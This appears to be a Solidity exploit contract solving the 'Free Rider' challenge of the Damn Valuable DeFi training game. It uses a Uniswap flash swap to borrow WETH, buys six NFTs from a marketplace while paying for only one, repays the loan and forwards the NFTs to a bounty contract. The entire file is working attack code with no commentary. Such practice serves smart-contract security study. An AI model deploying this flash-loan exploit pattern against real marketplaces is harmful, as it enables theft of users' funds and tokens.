//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

interface ISwap{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackerFreeRider{
    address immutable marketPlace;
    address immutable devContract;
    address immutable uniswapPair;
    IWETH immutable WETH;
    uint256 NFT_PRICE = 15 ether;
    uint256[] tokenIds = [0,1,2,3,4,5];
    address immutable owner;
    DamnValuableNFT immutable nft;


    constructor(address _marketPlace, address _devContract, address _uniswapPair, address _weth, address _nft){
        owner = msg.sender;
        marketPlace = _marketPlace;
        devContract = _devContract;
        uniswapPair = _uniswapPair;
        WETH = IWETH(_weth);
        nft = DamnValuableNFT(_nft);
    }

    function attack() external payable{
        bytes memory data = abi.encode(NFT_PRICE);
        ISwap(uniswapPair).swap(NFT_PRICE, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        WETH.withdraw(NFT_PRICE);
        IMarketPlace(marketPlace).buyMany{value:NFT_PRICE}(tokenIds);
        uint256 amountopay = (NFT_PRICE*1005)/1000;
        WETH.deposit{value:amountopay}();
        WETH.transfer(address(uniswapPair),amountopay);
        bytes memory daata = abi.encode(owner);
        for(uint256 i; i < tokenIds.length; i++){
            nft.safeTransferFrom(address(this), devContract, i, daata);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    )external pure returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}